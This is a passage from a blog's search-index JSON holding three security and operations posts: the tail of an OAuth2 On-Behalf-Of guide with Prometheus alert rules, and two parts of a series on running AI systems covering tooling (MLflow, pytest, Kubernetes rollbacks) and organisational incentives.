A:\nobo_token_exchange_requests_total{target_service, status} obo_token_exchange_duration_seconds_bucket{target_service} (histogram) obo_token_cache_hits_total{target_service} and obo_token_cache_misses_total{target_service} Prometheus Alert Rules (Examples) These assume you emit the metrics above.\ngroups: - name: oauth2_obo rules: - alert: OBOExchangeErrorRateHigh expr: | sum(rate(obo_token_exchange_requests_total{status=\u0026#34;error\u0026#34;}[5m])) / sum(rate(obo_token_exchange_requests_total[5m])) \u0026gt; 0.02 for: 10m labels: severity: critical annotations: summary: \u0026#34;High OBO token exchange error rate\u0026#34; description: \u0026#34;OBO exchange errors \u0026gt; 2% for 10 minutes\u0026#34; - alert: OBOIdPLatencyHighP95 expr: | histogram_quantile( 0.95, sum by (le) (rate(obo_token_exchange_duration_seconds_bucket[10m])) ) \u0026gt; 0.5 for: 10m labels: severity: warning annotations: summary: \u0026#34;OBO token exchange latency high (p95)\u0026#34; description: \u0026#34;p95 \u0026gt; 500ms for 10 minutes (IdP or network issues)\u0026#34; - alert: OBOTokenCacheHitRateLow expr: | sum(rate(obo_token_cache_hits_total[10m])) / (sum(rate(obo_token_cache_hits_total[10m])) + sum(rate(obo_token_cache_misses_total[10m]))) \u0026lt; 0.5 for: 30m labels: severity: info annotations: summary: \u0026#34;OBO token cache hit rate low\u0026#34; description: \u0026#34;Cache hit rate \u0026lt; 50% for 30 minutes (watch IdP load)\u0026#34; Tune thresholds to your environment. The point is to catch the two failures that hurt the most:\nthe IdP is slow/down (everything stacks up) caching broke (IdP load spikes, latency climbs, then you fall over) Logging Log token exchanges (without sensitive data):\n{ \u0026#34;timestamp\u0026#34;: \u0026#34;2026-02-04T12:00:00Z\u0026#34;, \u0026#34;service\u0026#34;: \u0026#34;api-gateway\u0026#34;, \u0026#34;event\u0026#34;: \u0026#34;token_exchange\u0026#34;, \u0026#34;target_service\u0026#34;: \u0026#34;user-service\u0026#34;, \u0026#34;token_hash\u0026#34;: \u0026#34;a1b2c3d4...\u0026#34;, \u0026#34;expires_in\u0026#34;: 3600, \u0026#34;duration_ms\u0026#34;: 45 } Distributed Tracing Add trace context to OBO exchanges:\nPOST /token HTTP/1.1 traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01 This lets you trace a request from client through Service A, Service B, and back.\nProduction Checklist Before going to production:\nAll services validate JWT signatures using proper libraries (never roll your own crypto) Every token exchange uses HTTPS Client secrets are stored securely (env vars, secret management) Token caching is implemented with proper TTL handling Scope validation happens at every service boundary Token refresh logic handles race conditions gracefully Monitoring and alerting set up for token exchange failures IdP is configured with appropriate token lifetimes Audience (aud) claims are set correctly per service Token revocation is tested and understood Rate limiting is in place on token exchange endpoints Audit logging captures security-relevant events Disaster recovery plan exists (IdP outage scenario) Further Reading OAuth2 Standards RFC 6749 - OAuth 2.0 RFC 7523 - JWT Bearer Token Grant RFC 7519 - JSON Web Token (JWT) RFC 7662 - Token Introspection IdP-Specific Documentation Microsoft Entra ID OBO flow Auth0 Token Exchange Keycloak Token Exchange Okta OAuth2 Flows Libraries and Tools Go: github.com/coreos/go-oidc Python: authlib Java: Spring Security OAuth Node.js: passport-oauth2 Testing: jwt.io - Decode and debug JWTs Best Practices OAuth 2.0 Security Best Current Practice NIST Digital Identity Guidelines OWASP OAuth2 Cheat Sheet Conclusion The OAuth2 OBO flow is a powerful pattern for microservice security, but it\u0026rsquo;s not simple. Done right, it gives you:\nZero trust architecture (every service verifies identity) Fine-grained access control (scopes per service) No credential sprawl (user credentials stay at the IdP) Done wrong, and you\u0026rsquo;ve got:\nSecurity vulnerabilities (token replay, scope escalation) Performance issues (too many token exchanges) Operational nightmares (hard to debug, hard to monitor) The key is to understand your requirements, choose the right tools, and implement carefully. Start small, test thoroughly, and scale gradually.\nGot questions? Found a mistake? I\u0026rsquo;m always happy to nerd out about OAuth2.\nThis post is based on my experience implementing secure microservice architectures across various industries. Your mileage may vary, and you should always consult your security team before implementing in production.\n","date":"4 Feb 2026","permalink":"https://gazsecops.github.io/posts/oauth2-obo-flow-complete-guide/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e Service A already has the user\u0026rsquo;s access token. Why don\u0026rsquo;t we just forward it to Service B?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Because it isn\u0026rsquo;t for Service B. Wrong audience, wrong scopes, and you just turned one compromise into \u0026ldquo;own the lot\u0026rdquo;.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e So what\u0026rsquo;s the right way?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Exchange it. Get a token meant for Service B, on behalf of the user. Validate it at Service B. Every time.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eThe On-Behalf-Of (OBO) flow is one of the lesser-understood OAuth2 grant types, yet it\u0026rsquo;s critical for secure microservice architectures.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\nOBO is how you keep user identity across service boundaries without turning your API gateway into a skeleton key.\n\u003c/aside\u003e\n\u003cp\u003eIt matters because it preserves user identity through a service chain, enables proper audit trails, and limits the damage when a single service gets popped.\u003c/p\u003e\n\u003cp\u003eIf you\u0026rsquo;re building microservices that need to maintain user context across service boundaries, this covers when to use OBO versus client credentials, security considerations, and practical implementation patterns.\u003c/p\u003e","tags":["oauth2","security","microservices","authentication","authorization"],"title":"OAuth2 On-Behalf-Of Flow: A Complete Guide for Microservices"},{"content":"Part 7 was meant to be the end. \u0026ldquo;Good luck, you\u0026rsquo;ll need it.\u0026rdquo; Fin.\nThen someone asked: \u0026ldquo;Alright, but what tools actually work? Not vendor pitches. Not \u0026lsquo;AI observability platforms\u0026rsquo; that cost more than my salary. Actual tools that help run AI systems without making everything worse.\u0026rdquo;\nFair question.\n\"The best AI ops tools are the boring ones. Prometheus. Grafana. Python scripts. Git. The same tools you'd use for normal systems, just pointed at different metrics.\" Bonus episode. Practical tools and techniques that actually help when you\u0026rsquo;re running AI systems. Things I\u0026rsquo;ve used. Things that work.\nThe Monitoring Stack What you need: Track accuracy, latency, input/output distributions, drift.\nWhat actually works:\nPrometheus + Grafana\nNot exciting. Not AI-specific. Works.\nExport metrics from your model service:\nPrediction count (by class, by confidence bucket) Latency (P50, P95, P99) Input feature distributions Accuracy (when you have ground truth) Model version being served Scrape with Prometheus. Visualize in Grafana. Alert on thresholds.\nCost: Free. Learning curve: Moderate. Reliability: High.\nWhy it works: Because it\u0026rsquo;s the same stack you use for everything else. You already know it. Your team already knows it. No new tools to learn. No vendor lock-in.\nInfluxDB + Telegraf (if you prefer time-series databases)\nSame idea. Different implementation. Also works fine.\nCloudWatch/Azure Monitor/GCP Monitoring (if you\u0026rsquo;re cloud-native)\nCosts money. Vendor lock-in. But if you\u0026rsquo;re already using AWS/Azure/GCP, might as well use their monitoring. Less to manage.\nThe Logging Stack What you need: Log predictions, inputs, outcomes. Join them later for accuracy calculations.\nWhat actually works:\nELK Stack (Elasticsearch, Logstash, Kibana)\nOld. Boring. Works.\nLog every prediction:\n{ \u0026#34;timestamp\u0026#34;: \u0026#34;2026-01-30T10:15:23Z\u0026#34;, \u0026#34;model_version\u0026#34;: \u0026#34;v2.3.1\u0026#34;, \u0026#34;prediction\u0026#34;: \u0026#34;spam\u0026#34;, \u0026#34;confidence\u0026#34;: 0.87, \u0026#34;input_hash\u0026#34;: \u0026#34;abc123\u0026#34;, \u0026#34;request_id\u0026#34;: \u0026#34;req_xyz\u0026#34; } Log ground truth when you get it:\n{ \u0026#34;timestamp\u0026#34;: \u0026#34;2026-01-30T10:20:15Z\u0026#34;, \u0026#34;request_id\u0026#34;: \u0026#34;req_xyz\u0026#34;, \u0026#34;actual\u0026#34;: \u0026#34;not_spam\u0026#34; } Join on request_id. Calculate accuracy. Alert when it drops.\nCost: Free (self-hosted) or moderate (managed). Learning curve: Moderate. Reliability: High.\nLoki + Grafana (if you want something lighter)\nLess heavy than Elasticsearch. Integrates with Grafana. Good enough for most use cases.\nJust write to S3/Cloud Storage and process later\nCheapest option. Log everything to cloud storage. Run batch jobs to calculate metrics. Works if you don\u0026rsquo;t need real-time.\nThe Data Pipeline What you need: Get data from models, transform it, store it, analyze it.\nWhat actually works:\nPython scripts + cron\nI\u0026rsquo;m serious. For most use cases, you don\u0026rsquo;t need Airflow or Kafka or Spark. You need a Python script that runs every hour.\n# check_model_accuracy.py # Run every hour via cron predictions = load_predictions_from_last_hour() ground_truth = load_ground_truth_from_last_hour() accuracy = calculate_accuracy(predictions, ground_truth) if accuracy \u0026lt; THRESHOLD: alert_on_call() log_to_prometheus(accuracy) Cost: Free. Learning curve: Low. Reliability: Good enough.\nAirflow (if you need orchestration)\nWhen your cron jobs get too complex, use Airflow. Not before.\ndbt (for data transformation)\nIf you\u0026rsquo;re doing SQL-heavy transformations, dbt is good. Version control for your queries. Tests for data quality.\nThe Experiment Tracking What you need: Track which model version is in production. Which performed best. What changed between versions.\nWhat actually works:\nMLflow\nOpen source. Does experiment tracking, model registry, deployment. Not perfect, but adequate.\nLog experiments during training. Register models. Deploy to production. Track which version is where.\nHere\u0026rsquo;s the smallest MLflow example that is still useful:\nimport mlflow import mlflow.sklearn from sklearn.ensemble import RandomForestClassifier X_train, y_train = load_training_data() X_val, y_val = load_validation_data() with mlflow.start_run(): model = RandomForestClassifier( n_estimators=200, random_state=42, ) model.fit(X_train, y_train) val_accuracy = model.score(X_val, y_val) mlflow.log_param(\u0026#34;n_estimators\u0026#34;, 200) mlflow.log_metric(\u0026#34;val_accuracy\u0026#34;, val_accuracy) mlflow.sklearn.log_model( sk_model=model, artifact_path=\u0026#34;model\u0026#34;, registered_model_name=\u0026#34;fraud-model\u0026#34;, ) Then you have a registry entry called fraud-model with versions. That\u0026rsquo;s what ops needs.\nIf you\u0026rsquo;re deploying via the registry, you can serve a specific version:\nmlflow models serve -m \u0026#34;models:/fraud-model/12\u0026#34; -p 5000 The useful operational habit is this: every model you deploy has a versioned identity you can point at during an incident.\nCost: Free. Learning curve: Moderate. Reliability: Decent.\nGit tags + artifact storage\nSimpler approach: Tag your git commits. Store model artifacts in S3/GCS/Azure Blob with version tags. Track deployments in a spreadsheet or database.\nNot fancy. Works.\nThe Testing Framework What you need: Test models before deployment. Test edge cases. Test integration.\nWhat actually works:\npytest + your own test data\nWrite tests like normal software:\ndef test_model_handles_empty_input(): prediction = model.predict(\u0026#34;\u0026#34;) assert prediction is not None def test_model_handles_unicode(): prediction = model.predict(\u0026#34;Hello 👋 émoji\u0026#34;) assert prediction is not None def test_model_accuracy_on_test_set(): accuracy = evaluate_model(test_data) assert accuracy \u0026gt; 0.90 Run before deployment. Fail deployment if tests fail.\nCost: Free. Learning curve: Low. Reliability: High.\nGreat Expectations (for data validation)\nTest your input data quality. Catches issues before they hit the model.\nexpect_column_values_to_be_between(\u0026#34;age\u0026#34;, 0, 120) expect_column_values_to_not_be_null(\u0026#34;user_id\u0026#34;) Useful for catching upstream data quality issues.\nThe Deployment Tools What you need: Deploy models. Roll back quickly. Route traffic gradually.\nWhat actually works:\nDocker + Kubernetes\nEveryone uses it. Documentation exists. People know how to debug it. Use it.\nPackage model in Docker container. Deploy to Kubernetes. Use rolling deployments. Use health checks. Use readiness probes.\nCost: Moderate (infrastructure). Learning curve: High. Reliability: High (when configured correctly).\nBlue-green deployments\nRun old version and new version simultaneously. Route a small percentage of traffic to new version. Monitor. Gradually increase. Roll back if it breaks.\nThere are two ways people do this.\nThe boring way (works): run two Deployments and switch the Service selector.\nmodel-service-blue (current) model-service-green (new) Service points at one of them via a label:\napiVersion: v1 kind: Service metadata: name: model-service spec: selector: app: model-service colour: blue ports: - port: 80 targetPort: 8080 Switching is a single patch:\nkubectl patch svc model-service -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;selector\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;model-service\u0026#34;,\u0026#34;colour\u0026#34;:\u0026#34;green\u0026#34;}}}\u0026#39; If you want traffic weighting and step-by-step rollout, use something that does it on purpose (Argo Rollouts, service mesh, cloud load balancer with weights). The point isn\u0026rsquo;t which tool. The point is: deploy and rollback are both fast and boring.\nFeature flags\nDeploy new model but don\u0026rsquo;t activate it yet. Use feature flag to control which model serves traffic. Can toggle instantly without redeployment.\nLaunchDarkly, Split.io, or roll your own with a config file.\nRolling your own is fine if you keep it simple.\nExample: a single config value that controls the active model version:\n{ \u0026#34;active_model\u0026#34;: \u0026#34;v2.3.1\u0026#34; } Your service reads it on a timer and switches:\nactive = load_config()[\u0026#34;active_model\u0026#34;] if active == \u0026#34;v2.3.1\u0026#34;: return predict_v231(req) return predict_v230(req) The rule for feature flags in model serving is the same as everywhere else:\nIf you can\u0026rsquo;t flip it back instantly, it\u0026rsquo;s not a feature flag. It\u0026rsquo;s a deployment. The Incident Response Tools What you need: When things break at 3am, what helps you fix it quickly?\nWhat actually works:\nRunbooks\nLiteral documents that say \u0026ldquo;When X happens, do Y.\u0026rdquo;\nModel accuracy dropped below 85%: 1. Check Grafana dashboard for accuracy trend 2. Check input distribution for drift 3. If drift detected, investigate upstream data pipeline 4. If no drift, check model version deployed 5. If wrong version, rollback using script: ./rollback.sh 6. If correct version, escalate to data science team Store in wiki. Update after every incident. Reference during incidents.\nCost: Free. Usefulness: High.\nChatOps\nRun commands from Slack. View dashboards from Slack. Get alerts in Slack.\nWhen incident happens, everyone\u0026rsquo;s in the same Slack channel. Can see the same data. Can run the same commands.\nPagerDuty, OpsGenie, or roll your own with Slack bots.\nRollback scripts\nOne command to roll back. Tested. Documented. Ready to run at 3am.\n#!/bin/bash # rollback.sh - Roll back to previous model version kubectl set image deployment/model-service model=model:v2.3.0 kubectl rollout status deployment/model-service Store in git. Test regularly. Don\u0026rsquo;t wait until 3am to discover it doesn\u0026rsquo;t work.\nThe Things You Don\u0026rsquo;t Need AI Observability Platforms\nVendors will sell you \u0026ldquo;AI-specific observability platforms.\u0026rdquo; Cost: Thousands per month.\nWhat do they do? Track metrics. Log predictions. Alert on drift.\nWhat can you do instead? Use Prometheus and ELK. Cost: Infrastructure only.\nDo you need AI-specific platforms? Maybe, if you\u0026rsquo;re running hundreds of models at scale. Probably not, if you\u0026rsquo;re running a handful.\nAutoML Platforms\nVendors will sell you platforms that \u0026ldquo;automatically build and deploy ML models.\u0026rdquo;\nDo they work? Sometimes. Are they worth the cost? Rarely.\nMost of the time, you need custom logic, custom preprocessing, custom evaluation. AutoML doesn\u0026rsquo;t handle that.\nModel Performance Management Tools\nVendors will sell you tools to \u0026ldquo;manage model performance in production.\u0026rdquo;\nWhat do they do? Track accuracy. Alert on drift. Suggest retraining.\nWhat can you do instead? Write Python scripts. Calculate accuracy yourself. Alert yourself.\nException: If you\u0026rsquo;re managing dozens of models, a dedicated tool might make sense. For a few models? Overkill.\nThe Actual Stack I\u0026rsquo;d Use If I were setting up AI ops from scratch, here\u0026rsquo;s what I\u0026rsquo;d use:\nMonitoring: Prometheus + Grafana Logging: Loki + Grafana (or ELK if I need search) Data Pipeline: Python scripts + cron (upgrade to Airflow when needed) Experiment Tracking: MLflow (or git tags if simple) Testing: pytest + Great Expectations Deployment: Docker + Kubernetes Incident Response: Runbooks in wiki + Slack + rollback scripts\nTotal cost: Infrastructure only. No vendor subscriptions. No lock-in. Everything\u0026rsquo;s open source or DIY.\nLearning curve: Moderate. But you\u0026rsquo;d learn these tools anyway for normal ops.\nThe Pattern Notice the pattern? The tools that work are boring tools you\u0026rsquo;d use for any system. Just pointed at different metrics.\nYou don\u0026rsquo;t need AI-specific tools. You need good operational practices applied to AI systems.\nMonitor the right things. Log the right things. Test properly. Deploy carefully. Respond quickly.\nSame as any other system. Just with different failure modes.\nWhat About The Fancy Stuff? \u0026ldquo;But what about [insert trendy AI ops tool here]?\u0026rdquo;\nMaybe it\u0026rsquo;s good. Maybe it\u0026rsquo;s useful. Maybe it solves real problems.\nBut start with the boring tools first. Prometheus. Grafana. Python scripts. Git.\nGet those working. Get good at using them. Then, if you hit a problem the boring tools can\u0026rsquo;t solve, look at the fancy tools.\nMost teams never hit that point. Most teams would benefit more from using Prometheus correctly than from buying an AI observability platform.\nThe Real Tool That Helps The actual tool that helps the most? Not software.\nIt\u0026rsquo;s discipline.\nDiscipline to write tests even when deadlines loom. Discipline to monitor even when everything\u0026rsquo;s working. Discipline to document even when you\u0026rsquo;re tired. Discipline to say no even when management pushes.\nNo tool will save you if you don\u0026rsquo;t have discipline.\nBoring tools + discipline \u0026gt; Fancy tools + chaos.\nPart 9? There won\u0026rsquo;t be a Part 9. This was the bonus episode. The series is done.\nSeven parts on what goes wrong. One bonus part on what actually helps.\nIf you\u0026rsquo;ve read all eight parts and you\u0026rsquo;re still running AI systems, you\u0026rsquo;re either brave or foolish. Probably both.\nGood luck. You\u0026rsquo;ll still need it.\nPart 8 (Bonus) of a series on running AI systems. Part 1: Who Carries the Can? | Part 2: Monitoring | Part 3: Incident Response | Part 4: Testing | Part 5: When to Say No | Part 6: Case Studies | Part 7: Organizational Dysfunction\n","date":"30 Jan 2026","permalink":"https://gazsecops.github.io/posts/ai-systems-responsibility-part-8/","summary":"\u003cp\u003ePart 7 was meant to be the end. \u0026ldquo;Good luck, you\u0026rsquo;ll need it.\u0026rdquo; Fin.\u003c/p\u003e\n\u003cp\u003eThen someone asked: \u0026ldquo;Alright, but what tools actually work? Not vendor pitches. Not \u0026lsquo;AI observability platforms\u0026rsquo; that cost more than my salary. Actual tools that help run AI systems without making everything worse.\u0026rdquo;\u003c/p\u003e\n\u003cp\u003eFair question.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"The best AI ops tools are the boring ones. Prometheus. Grafana. Python scripts. Git. The same tools you'd use for normal systems, just pointed at different metrics.\"\n\u003c/aside\u003e\n\u003cp\u003eBonus episode. Practical tools and techniques that actually help when you\u0026rsquo;re running AI systems. Things I\u0026rsquo;ve used. Things that work.\u003c/p\u003e","tags":["ai","tools","operations","series"],"title":"AI Systems Responsibility: Part 8 - Practical Tools That Actually Help (Bonus Episode)"},{"content":"Six parts of this series explaining what goes wrong with AI systems. Testing that doesn\u0026rsquo;t happen. Monitoring that doesn\u0026rsquo;t exist. Models shipped before they\u0026rsquo;re ready. Incidents that could have been prevented.\nYou\u0026rsquo;d think after reading all that, teams would learn. They don\u0026rsquo;t.\nThe same mistakes happen over and over. Not because people are stupid. Because the organizational incentives guarantee failure.\n\"You can have thorough testing or you can ship by Friday. You can't have both. Management always picks Friday.\" Part 7. The last of the core series. Why organizations are structurally incapable of running AI systems properly, and what you can do about it (spoiler: not much).\nThe Incentive Problem What gets rewarded: Shipping fast. Meeting deadlines. Saying yes. Being a team player. Delivering features.\nWhat gets punished: Saying no. Raising concerns. Delaying deployments. Being \u0026ldquo;negative.\u0026rdquo; Blocking progress.\nYou\u0026rsquo;re a sysadmin. You see a model that isn\u0026rsquo;t ready. You raise concerns. What happens?\nBest case: You\u0026rsquo;re overruled. Model ships anyway. When it breaks, you get blamed for not testing it properly.\nWorst case: You\u0026rsquo;re labeled \u0026ldquo;not a team player.\u0026rdquo; Passed over for promotion. Eventually managed out.\nEither way, the model ships.\nSo next time, you raise concerns less loudly. Or you don\u0026rsquo;t raise them at all. Model ships. Breaks. Cycle repeats.\nThe incentives guarantee bad outcomes.\nThe Knowledge Problem Who knows the model is broken: Sysadmins. Data scientists. Engineers. People actually testing it.\nWho decides whether to ship: Management. Product managers. Sales. People who haven\u0026rsquo;t seen the test results.\nWho bridges the gap: Nobody, effectively.\nConversation goes like this:\nEngineer: The model fails on edge case X.\nManagement: How often does edge case X occur?\nEngineer: 5% of inputs.\nManagement: So it works 95% of the time?\nEngineer: Well, yes, but-\nManagement: Good enough. Ship it.\nEngineer tried to communicate risk. Management heard \u0026ldquo;95% success rate.\u0026rdquo; Shipped broken model.\nThis isn\u0026rsquo;t management being stupid. This is a communication failure. Technical people speak in technical terms. Management hears business terms. Risk gets lost in translation.\nThe Metrics Problem What gets measured: Deployment velocity. Feature delivery. Time to market.\nWhat doesn\u0026rsquo;t get measured: Quality. Reliability. Maintainability. Long-term sustainability.\nYou can\u0026rsquo;t manage what you don\u0026rsquo;t measure. If you\u0026rsquo;re measuring velocity but not quality, guess which one gets optimized?\nTeams that ship fast get rewarded. Teams that ship reliable software get ignored. So teams optimize for shipping fast.\nModel\u0026rsquo;s ready? Ship it. Model\u0026rsquo;s not ready? Ship it anyway. We\u0026rsquo;ll fix it in production.\nThen production breaks. Everyone\u0026rsquo;s surprised. \u0026ldquo;How did we not catch this in testing?\u0026rdquo;\nYou didn\u0026rsquo;t catch it in testing because testing takes time and you measured velocity.\nThe Responsibility Problem Who\u0026rsquo;s responsible for the model working: Everyone, theoretically. Nobody, practically.\nData scientists build it. Engineers deploy it. Ops runs it. Product defines requirements. Management approves it.\nWhen it breaks, whose fault is it?\nData scientists: \u0026ldquo;We built what product asked for.\u0026rdquo;\nProduct: \u0026ldquo;We specified the requirements. Engineering should have tested it.\u0026rdquo;\nEngineering: \u0026ldquo;We deployed what data science built. Ops should have monitored it.\u0026rdquo;\nOps: \u0026ldquo;We monitored uptime. Model accuracy isn\u0026rsquo;t our responsibility.\u0026rdquo;\nEverybody\u0026rsquo;s fault. Nobody\u0026rsquo;s fault. No accountability.\nSo the model breaks again. And again. And nobody fixes the underlying problem because nobody owns it.\nThe Time Horizon Problem What management cares about: This quarter\u0026rsquo;s results. This year\u0026rsquo;s targets.\nWhat AI systems need: Long-term planning. Sustained investment. Continuous maintenance.\nManagement wants results now. Ship the model. Hit the deadline. Show ROI this quarter.\nAI systems degrade over time. Data drifts. Accuracy drops. Models need retraining. This takes ongoing effort and investment.\nBut ongoing investment doesn\u0026rsquo;t show immediate ROI. So it doesn\u0026rsquo;t happen. Models get deployed and abandoned. Accuracy degrades. Nobody notices until it\u0026rsquo;s critical.\nThen: emergency retraining. Crisis mode. \u0026ldquo;Why didn\u0026rsquo;t we see this coming?\u0026rdquo;\nYou did see it coming. You chose not to invest in preventing it.\nThe Expertise Problem Who has AI expertise: Data scientists. ML engineers. A handful of specialists.\nWho\u0026rsquo;s running AI systems: Regular engineers and sysadmins who\u0026rsquo;ve never dealt with this before.\nTraditional software: Most engineers understand it. Standard patterns. Known failure modes. Well-documented debugging techniques.\nAI systems: Specialized knowledge required. Most engineers don\u0026rsquo;t have it. Learning curve is steep. Documentation is sparse.\nResult: Systems running in production that nobody fully understands. When they break, nobody knows how to fix them. Escalation to the few people who do understand. Bottleneck. Delays. Incidents.\nWorse: The people who built the models move on. Take the knowledge with them. New team inherits systems they don\u0026rsquo;t understand. Can\u0026rsquo;t maintain properly. Can\u0026rsquo;t debug effectively.\nThe Culture Problem What the culture says: Move fast. Break things. Iterate. Fail fast. Ship and learn.\nWhat AI needs: Move carefully. Test thoroughly. Plan for failure. Understand before shipping.\nThese are fundamentally incompatible.\nMove-fast culture works for web apps where you can deploy fixes in minutes. Doesn\u0026rsquo;t work for AI where you can\u0026rsquo;t quickly fix a broken model at 3am.\nBut nobody wants to change the culture. Culture made the company successful. AI is just another technology. Use the same process. Ship fast. Fix in production.\nThen production breaks. And you can\u0026rsquo;t fix it quickly. And customers are affected. And management asks why we didn\u0026rsquo;t test it properly.\nBecause your culture doesn\u0026rsquo;t allow time for testing properly.\nThe Technical Debt Problem What happens when you move fast: Technical debt accumulates. Shortcuts. Workarounds. \u0026ldquo;We\u0026rsquo;ll fix it later.\u0026rdquo;\nWhat happens to technical debt: It doesn\u0026rsquo;t get fixed. It accumulates. It compounds. It eventually breaks everything.\nAI systems compound this. Every shortcut in data pipelines. Every workaround in feature engineering. Every \u0026ldquo;good enough\u0026rdquo; model shipped without proper testing.\nIt all accumulates.\nThen: Someone needs to debug why the model broke. Discovers three layers of workarounds. Nobody remembers why. Nobody documented it. Can\u0026rsquo;t fix without breaking something else.\nTechnical debt is insidious. Doesn\u0026rsquo;t show up in sprint velocity. Doesn\u0026rsquo;t affect this quarter\u0026rsquo;s metrics. Just slowly makes everything harder until the system is unmaintainable.\nWhat Actually Works (Rarely) Some organizations get this right. Not many. Here\u0026rsquo;s what they do differently:\n1. They measure quality, not just velocity\nTrack defects. Track incidents. Track time to resolve. Track customer satisfaction. Reward teams that ship reliable software, not just fast software.\n2. They enforce gates\nCan\u0026rsquo;t deploy without test results. Can\u0026rsquo;t deploy without monitoring. Can\u0026rsquo;t deploy without rollback plan. No exceptions. No \u0026ldquo;we\u0026rsquo;ll do it in v2.\u0026rdquo;\n3. They staff for maintenance, not just features\nBudget for ongoing maintenance. Budget for retraining. Budget for monitoring. Don\u0026rsquo;t treat AI as \u0026ldquo;ship it and forget it.\u0026rdquo;\n4. They have actual ownership\nOne team owns each model end-to-end. Data science, engineering, ops. All one team. No handing off. No \u0026ldquo;not my problem.\u0026rdquo;\n5. They invest in expertise\nTrain engineers on AI systems. Hire people with ML ops experience. Don\u0026rsquo;t expect regular sysadmins to magically understand how to run models in production.\n6. They actually say no\nWhen a model isn\u0026rsquo;t ready, they don\u0026rsquo;t ship it. Deadlines slip. Management gets upset. They ship it when it\u0026rsquo;s ready.\nMost organizations don\u0026rsquo;t do any of this. Too hard. Too slow. Not enough ROI.\nSo they keep making the same mistakes.\nWhat You Can Actually Do You\u0026rsquo;re a sysadmin. You\u0026rsquo;re responsible for keeping AI systems running. You don\u0026rsquo;t control the culture. You don\u0026rsquo;t set the incentives. You don\u0026rsquo;t make the decisions.\nWhat can you do?\n1. Document everything\nWhen you raise concerns and get overruled, document it. Email. Tickets. Slack messages. Contemporaneous record. Not to cover your arse (though it does). To have evidence when things break.\nWhat to track in a \u0026ldquo;known issues\u0026rdquo; log:\n| Date | Model/System | Issue Raised | Evidence | Decision | Outcome | |------|---------------|--------------|----------|----------|---------| | 2026-01-15 | Fraud v2 | 30% false positive on new card types | Test results, p-value \u0026lt; 0.01 | Ship anyway, fix in v2.1 | [Pending] | | 2026-01-20 | Chatbot | No input validation on prompts | Adversarial test, 3/5 exploits worked | Add rate limiting, ship | [Pending] | Fill in the \u0026ldquo;Outcome\u0026rdquo; column when it breaks (or doesn\u0026rsquo;t). This is your evidence base. When management asks \u0026ldquo;why do we keep having these incidents?\u0026rdquo;, you have data.\n2. Build visibility\nMake problems visible. Dashboards showing accuracy degradation. Reports showing technical debt. Metrics showing incident frequency. Can\u0026rsquo;t ignore what you can see.\nMetrics that force attention:\nAI system health (weekly report): - Average model accuracy: [X]% - Accuracy trend (4 weeks): [improving/stable/degrading] - Incidents this month: [X] - Incidents caused by known issues: [X] (what we shipped anyway) - Mean time to detect: [X] minutes - Mean time to rollback: [X] minutes Technical debt: - Models without monitoring: [X] - Models with no documented failure modes: [X] - Models where original author left: [X] - Rollback procedures tested in last 90 days: [X/Y] When you put these numbers in front of management every month, patterns become obvious. \u0026ldquo;We\u0026rsquo;ve had 4 incidents this quarter from models we knew were broken\u0026rdquo; is harder to ignore than vague complaints.\n3. Build allies\nFind people who care about reliability. Engineers who are tired of 3am incidents. Managers who\u0026rsquo;ve been burned before. Product people who\u0026rsquo;ve lost customers to bugs. Build coalition.\n4. Pick your battles\nYou can\u0026rsquo;t fight everything. Choose what matters. Critical systems. High-risk deployments. Known failure modes. Fight those. Let the small stuff go.\n5. Demonstrate value\nWhen you prevent an incident by catching a bug, make it known. When you roll back quickly and save the day, make it known. Build reputation for being right.\n6. Have a backup plan\nIf it all goes to hell, what\u0026rsquo;s your plan? Different team? Different company? Different career? Don\u0026rsquo;t get stuck in an organization that doesn\u0026rsquo;t value what you do.\nThe Uncomfortable Truth Most organizations are structurally incapable of running AI systems properly. The incentives are wrong. The culture is wrong. The processes are wrong.\nYou can fight it. You can push back. You can document. You can build allies.\nSometimes you\u0026rsquo;ll win. More often you\u0026rsquo;ll lose.\nThe system is designed to produce bad outcomes. Your job is to minimize the damage. Not prevent it entirely. Minimize it.\nKeep the incidents small. Keep the blast radius contained. Keep the rollback plan ready.\nBecause the 3am phone call is coming. The model will break. Production will fail.\nAnd when it does, you\u0026rsquo;re the one who has to fix it.\nThe End That\u0026rsquo;s the core series. Seven parts on running AI systems responsibly. There\u0026rsquo;s a bonus Part 8 with practical tools.\nWhat you should do:\nTest properly (Part 4) Monitor everything (Part 2) Have rollback plans (Part 1) Prepare for incidents (Part 3) Say no when it matters (Part 5) Learn from failures (Part 6) What will actually happen:\nDeadlines will slip Testing will get cut Models will ship broken Production will break You\u0026rsquo;ll fix it at 3am Cycle repeats Welcome to running AI systems in the real world.\nGood luck. You\u0026rsquo;ll need it.\nPart 7 of a series on running AI systems. Part 1: Who Carries the Can? | Part 2: Monitoring | Part 3: Incident Response | Part 4: Testing | Part 5: When to Say No | Part 6: Case Studies | Part 8: Practical Tools\n","date":"23 Jan 2026","permalink":"https://gazsecops.github.io/posts/ai-systems-responsibility-part-7/","summary":"\u003cp\u003eSix parts of this series explaining what goes wrong with AI systems. Testing that doesn\u0026rsquo;t happen. Monitoring that doesn\u0026rsquo;t exist. Models shipped before they\u0026rsquo;re ready. Incidents that could have been prevented.\u003c/p\u003e\n\u003cp\u003eYou\u0026rsquo;d think after reading all that, teams would learn. They don\u0026rsquo;t.\u003c/p\u003e\n\u003cp\u003eThe same mistakes happen over and over. Not because people are stupid. Because the organizational incentives guarantee failure.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"You can have thorough testing or you can ship by Friday. You can't have both. Management always picks Friday.\"\n\u003c/aside\u003e\n\u003cp\u003ePart 7. The last of the core series. Why organizations are structurally incapable of running AI systems properly, and what you can do about it 